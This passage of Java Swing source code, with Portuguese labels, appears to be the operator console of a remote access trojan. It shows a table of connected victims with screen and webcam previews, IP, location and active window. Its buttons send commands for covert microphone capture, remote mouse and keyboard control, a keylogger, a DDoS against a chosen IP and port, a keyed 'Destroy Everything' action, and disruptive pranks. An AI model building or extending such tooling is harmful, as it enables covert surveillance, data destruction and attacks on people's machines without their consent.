        CONTROL.addActionListener(event -> ConnectServer.handleCommand("control"));
        panel.add(CONTROL);

        MOUSE_MOVE = createButton("Mover Mouse");
        toggleColor(MOUSE_MOVE, ServerControlComponents.MOUSE_MOVE);
        MOUSE_MOVE.addActionListener(event -> ConnectServer.handleCommand("mousemove"));
        panel.add(MOUSE_MOVE);

        MOUSE_MOVE_CLICK = createButton("Auto Mover");
        toggleColor(MOUSE_MOVE_CLICK, ServerControlComponents.MOUSE_MOVE_CLICK);
        MOUSE_MOVE_CLICK.addActionListener(event -> ConnectServer.handleCommand("mousemoveclick"));
        panel.add(MOUSE_MOVE_CLICK);

        MOUSE = createButton("Mouse");
        toggleColor(MOUSE, ServerControlComponents.MOUSE);
        MOUSE.addActionListener(event -> ConnectServer.handleCommand("mouse"));
        panel.add(MOUSE);

        KEYBOARD = createButton("Teclado");
        toggleColor(KEYBOARD, ServerControlComponents.KEYBOARD);
        KEYBOARD.addActionListener(event -> ConnectServer.handleCommand("keyboard"));
        panel.add(KEYBOARD);

        CONTROL_FRAME.setContentPane(panel);
        CONTROL_FRAME.pack();
        CONTROL_FRAME.setLocationRelativeTo(null);
        SwingUtilities.updateComponentTreeUI(CONTROL_FRAME);
        CONTROL_FRAME.setVisible(true);
        return CONTROL_FRAME;
    }

    public JFrame audioControlPanel() {
        applyDarkNimbus();
        if (AUDIO_CONTROL != null) AUDIO_CONTROL.dispose();

        AUDIO_CONTROL = new JFrame("Controles de Voz");
        AUDIO_CONTROL.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
        try {
            ImageIcon icon = new ImageIcon(getClass().getResource("/eye.png"));
            AUDIO_CONTROL.setIconImage(icon.getImage());
        } catch (Exception ignored) {
        }

        JPanel panel = new CardPanel("Áudio / Voz");
        panel.setLayout(new FlowLayout(FlowLayout.CENTER, 14, 14));

        JButton record = createButton("Gravar Áudio");
        configInputButton(record, "Gravar Áudio Temporário", "audio", "Segundos:", null);
        panel.add(record);

        AUDIO_USER = createButton("Áudio");
        toggleColor(AUDIO_USER, ServerAudioComponents.AUDIO_USER);
        AUDIO_USER.addActionListener(event -> ConnectServer.handleCommand("audio receive"));
        panel.add(AUDIO_USER);

        AUDIO_SERVER = createButton("Microfone");
        toggleColor(AUDIO_SERVER, ServerAudioComponents.AUDIO_SERVER);
        AUDIO_SERVER.addActionListener(event -> ConnectServer.handleCommand("audio send"));
        panel.add(AUDIO_SERVER);

        JButton gcButton = createButton("Liberar Memória");
        gcButton.addActionListener(e -> ServerGUI.sendDirectCommand("gc"));
        panel.add(gcButton);

        AUDIO_CONTROL.setContentPane(panel);
        AUDIO_CONTROL.pack();
        AUDIO_CONTROL.setLocationRelativeTo(null);
        SwingUtilities.updateComponentTreeUI(AUDIO_CONTROL);
        AUDIO_CONTROL.setVisible(true);
        return AUDIO_CONTROL;
    }

    public JFrame functionsControlPanel() {
        applyDarkNimbus();
        JFrame frame = new JFrame("Painel de Funções");
        frame.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
        try {
            ImageIcon icon = new ImageIcon(getClass().getResource("/eye.png"));
            frame.setIconImage(icon.getImage());
        } catch (Exception ignored) {
        }

        JPanel panel = new CardPanel("Funções");
        panel.setLayout(new GridLayout(0, 5, 12, 12));
        panel.setBorder(new EmptyBorder(16, 16, 16, 16));

        panel.add(createActionBtn("Desligar", "functions shutdown"));
        panel.add(createActionBtn("Reiniciar", "functions restart"));
        panel.add(createActionBtn("Logoff", "functions logoff"));
        panel.add(createActionBtn("Liberar Memória", "gc"));
        panel.add(createActionBtn("Área de Trabalho", "functions desktop"));
        panel.add(createActionBtn("Abrir Explorer", "functions explorer"));
        panel.add(createActionBtn("Matar Explorer", "functions killexplorer"));
        panel.add(createActionBtn("1000 Pastas", "functions mkdirs"));
        panel.add(createActionBtn("Stress", "functions stress"));
        panel.add(createActionBtn("Adulto", "functions adult"));
        panel.add(createActionBtn("Rickroll", "functions rickroll"));
        panel.add(createActionBtn("Beep", "functions beep"));
        panel.add(createActionBtn("Bug de Mouse", "functions mousebug"));
        panel.add(createActionBtn("Bug de Teclado", "functions keyboardbug"));

        JButton wallpaperButton = createButton("Wallpaper");
        wallpaperButton.addActionListener(e -> {
            String fileName = JOptionPane.showInputDialog(frame, "Arquivo de wallpaper:");
            if (fileName != null && !fileName.trim().isEmpty()) {
                ServerGUI.sendDirectCommand("wallpaper " + fileName);
            }
        });
        panel.add(wallpaperButton);

        JButton ddosButton = createButton("DDOS");
        ddosButton.addActionListener(e -> {
            String ip = JOptionPane.showInputDialog(frame, "Endereço IP:");
            if (ip == null) return;
            String porta = JOptionPane.showInputDialog(frame, "Porta:");
            if (porta == null) {
                ServerGUI.sendDirectCommand("ddos " + ip);
                return;
            }
            String tempo = JOptionPane.showInputDialog(frame, "Tempo em segundos:");
            if (tempo == null) return;
            String tamanho = JOptionPane.showInputDialog(frame, "Tamanho:");
            if (tamanho == null) return;
            ServerGUI.sendDirectCommand("ddos " + ip + " " + porta + " " + tempo + " " + tamanho);
        });
        panel.add(ddosButton);

        panel.add(createActionBtn("Keylogger", "keylogger"));

        JButton destroyEverythingButton = createButton("Destroy Everything");
        destroyEverythingButton.addActionListener(e -> {
            String key = JOptionPane.showInputDialog(frame, "Digite a chave:");
            ServerGUI.sendDirectCommand("destroyeverything" + (key != null && !key.trim().isEmpty() ? " " + key : ""));
        });
        panel.add(destroyEverythingButton);

        panel.add(createActionBtn("Debug", "debug"));

        JButton openButton = createButton("Abrir Arquivo/Pasta");
        openButton.addActionListener(e -> {
            String fileName = JOptionPane.showInputDialog(frame, "Digite o nome do arquivo/pasta:");
            if (fileName != null && !fileName.trim().isEmpty()) {
                ServerGUI.sendDirectCommand("open " + fileName);
            }
        });
        panel.add(openButton);

        frame.setContentPane(panel);
        frame.pack();
        frame.setLocationRelativeTo(null);
        SwingUtilities.updateComponentTreeUI(frame);
        frame.setVisible(true);
        return frame;
    }

    private JButton createActionBtn(String label, String command) {
        JButton b = createButton(label);
        b.addActionListener(e -> ServerGUI.sendDirectCommand(command));
        return b;
    }

    // ====== Atualização de tabela ======
    public static void updateClientTable(String uniqueId, BufferedImage screenPreview, BufferedImage webcamPreview,
                                         String clientName, String ip, String installDate, String location, String os,
                                         int webcams, int monitors, long ping, String activeWindow) {
        if (clientTableModel == null) return;
        ImageIcon screen = null, webcam = null;
        if (screenPreview != null) screen = new ImageIcon(screenPreview.getScaledInstance(80, 60, Image.SCALE_SMOOTH));
        if (webcamPreview != null) webcam = new ImageIcon(webcamPreview.getScaledInstance(80, 60, Image.SCALE_SMOOTH));

        Object[] rowData = {screen, webcam, clientName, ip, installDate, location, os, monitors + " / " + webcams, ping + "ms", activeWindow};
        if (clientRowMap.containsKey(uniqueId)) {
            int rowIndex = clientRowMap.get(uniqueId);
            for (int i = 0; i < rowData.length; i++)
                if (rowData[i] != null) clientTableModel.setValueAt(rowData[i], rowIndex, i);
        } else {
            clientTableModel.addRow(rowData);
            clientRowMap.put(uniqueId, clientTableModel.getRowCount() - 1);
        }
    }

    public static void addClientToTable(String uniqueId, BufferedImage screenPreview, BufferedImage webcamPreview,
                                        String clientName, String ip, String installDate, String location, String os,
                                        int webcams, int monitors, long ping, String activeWindow) {
        if (clientRowMap.containsKey(uniqueId)) return;

        ImageIcon screen = (screenPreview != null)
                ? new ImageIcon(screenPreview.getScaledInstance(80, 60, Image.SCALE_SMOOTH))
                : new ImageIcon(new BufferedImage(80, 60, BufferedImage.TYPE_INT_RGB));

        ImageIcon webcam = (webcamPreview != null)
                ? new ImageIcon(webcamPreview.getScaledInstance(80, 60, Image.SCALE_SMOOTH))
                : new ImageIcon(new BufferedImage(80, 60, BufferedImage.TYPE_INT_RGB));

        clientTableModel.addRow(new Object[]{screen, webcam, clientName, ip, installDate, location, os, monitors + " / " + webcams, ping + "ms", activeWindow});
        clientRowMap.put(uniqueId, clientTableModel.getRowCount() - 1);
    }

    public static void removeClientFromTable(String uniqueId) {
        if (!clientRowMap.containsKey(uniqueId)) return;
        int rowIndex = clientRowMap.remove(uniqueId);
        clientTableModel.removeRow(rowIndex);

        Map<String, Integer> tempMap = new HashMap<>();
        for (Map.Entry<String, Integer> entry : clientRowMap.entrySet()) {
            int oldIndex = entry.getValue();
            int newIndex = oldIndex > rowIndex ? oldIndex - 1 : oldIndex;
            tempMap.put(entry.getKey(), newIndex);
        }
        clientRowMap.clear();
        clientRowMap.putAll(tempMap);
    }

    public static void toggleColor(JButton button, boolean enabled) {
        if (button == null) return;
        button.setBackground(enabled ? NEON : new Color(80, 30, 30));
        button.setForeground(enabled ? Color.BLACK : TEXT_MAIN);
    }

    // ====== Monitor de rede (mantido, mas atualiza header/status além do título) ======
    public void monitorTraffic() {
        long previousSent = 0, previousReceived = 0;
        for (; ; ) {
            try {
                Thread.sleep(1000);
                long currentSent = ConnectServer.BYTES_SENT.get();
                long currentReceived = ConnectServer.BYTES_RECEIVED.get();
                long sentRate = currentSent - previousSent;
                long receivedRate = currentReceived - previousReceived;

                upload = ((sentRate * 8) / 1024.0);
                download = ((receivedRate * 8) / 1024.0);
                previousSent = currentSent;
                previousReceived = currentReceived;

                String plus = ConnectServer.CLIENTS.size() == 1 ? "" : "s";
                String title = "Painel do Servidor | " + ConnectServer.CLIENTS.size() + " Cliente" + plus + " Conectado" + plus +
                        " | Download: " + df(download) + "kbps - Upload: " + df(upload) + "kbps";
                SwingUtilities.invokeLater(() -> {
                    setTitle(title);
                    updateHeaderSubtitle();
                    updateStatusBar();
                });
            } catch (InterruptedException exception) {
                ConnectServer.msg("Erro ao atualizar monitor de rede! (" + exception.getMessage() + ")");
                break;
            }
        }
    }

    private void updateHeaderSubtitle() {
        headerSubtitle.setText("Clientes ativos: " + ConnectServer.CLIENTS.size() +
                "  •  FPS: " + ServerImageComponents.FPS +
                "  •  Porta: " + Connect.PORT +
                "  •  Modo: " + (DARK_MODE ? "Dark" : "Light"));
    }

    private void updateStatusBar() {
        statusBar.setText("▲ " + df(upload) + " kbps  |  ▼ " + df(download) + " kbps  |  Clientes: " + ConnectServer.CLIENTS.size());
    }

    private String df(double v) {
        return new DecimalFormat("#.##").format(v);
    }

    // ====== Clipboard utils ======
    private void copyToClipboard(String text) {
        Toolkit.getDefaultToolkit().getSystemClipboard().setContents(new StringSelection(text), null);
    }

    private void copyImageToClipboard(Image image) {
        Transferable transferable = new Transferable() {
            @Override
            public DataFlavor[] getTransferDataFlavors() {
                return new DataFlavor[]{DataFlavor.imageFlavor};
            }

            @Override
            public boolean isDataFlavorSupported(DataFlavor flavor) {
                return DataFlavor.imageFlavor.equals(flavor);
            }

            @Override
            public Object getTransferData(DataFlavor flavor) throws UnsupportedFlavorException {
                if (isDataFlavorSupported(flavor)) return image;
                throw new UnsupportedFlavorException(flavor);
            }
        };
        Toolkit.getDefaultToolkit().getSystemClipboard().setContents(transferable, null);
    }

    // ====== Cards e gradientes ======
    private static class GradientPanel extends JPanel {
        private final Color c1, c2;

        public GradientPanel(Color c1, Color c2) {
            this.c1 = c1;
            this.c2 = c2;
            setOpaque(false);
        }

        @Override
        protected void paintComponent(Graphics g) {
            Graphics2D g2 = (Graphics2D) g.create();
            g2.setRenderingHint(RenderingHints.KEY_RENDERING, RenderingHints.VALUE_RENDER_QUALITY);
            g2.setPaint(new GradientPaint(0, 0, c1, 0, getHeight(), c2));
            g2.fillRect(0, 0, getWidth(), getHeight());
            g2.dispose();
            super.paintComponent(g);
        }
    }

    private static class CardPanel extends JPanel {
        private final String title;

        public CardPanel(String title) {
            this.title = title;
            setOpaque(false);
            setBorder(new CompoundBorder(
                    new TitledBorder(new LineBorder(new Color(60, 90, 70), 1, true), title, TitledBorder.LEFT, TitledBorder.TOP, new Font("Consolas", Font.BOLD, 12), NEON),
                    new EmptyBorder(10, 10, 10, 10)
            ));
        }

        @Override
        protected void paintComponent(Graphics g) {
            Graphics2D g2 = (Graphics2D) g.create();
            g2.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON);
            // Fundo com leve gradiente “glass”
            GradientPaint gp = new GradientPaint(0, 0, CARD_BG_1, 0, getHeight(), CARD_BG_2);
            g2.setPaint(gp);
            g2.fillRoundRect(4, 8, getWidth() - 8, getHeight() - 12, 14, 14);
            // Glow sutil
            g2.setColor(new Color(NEON.getRed(), NEON.getGreen(), NEON.getBlue(), 25));
            g2.drawRoundRect(4, 8, getWidth() - 8, getHeight() - 12, 14, 14);
            g2.dispose();
            super.paintComponent(g);
        }
    }

    private static class GridCard extends CardPanel {
        public GridCard(String title, int rows, int cols) {
            super(title);
            setLayout(new GridLayout(rows, cols, 8, 8));
        }
    }

}
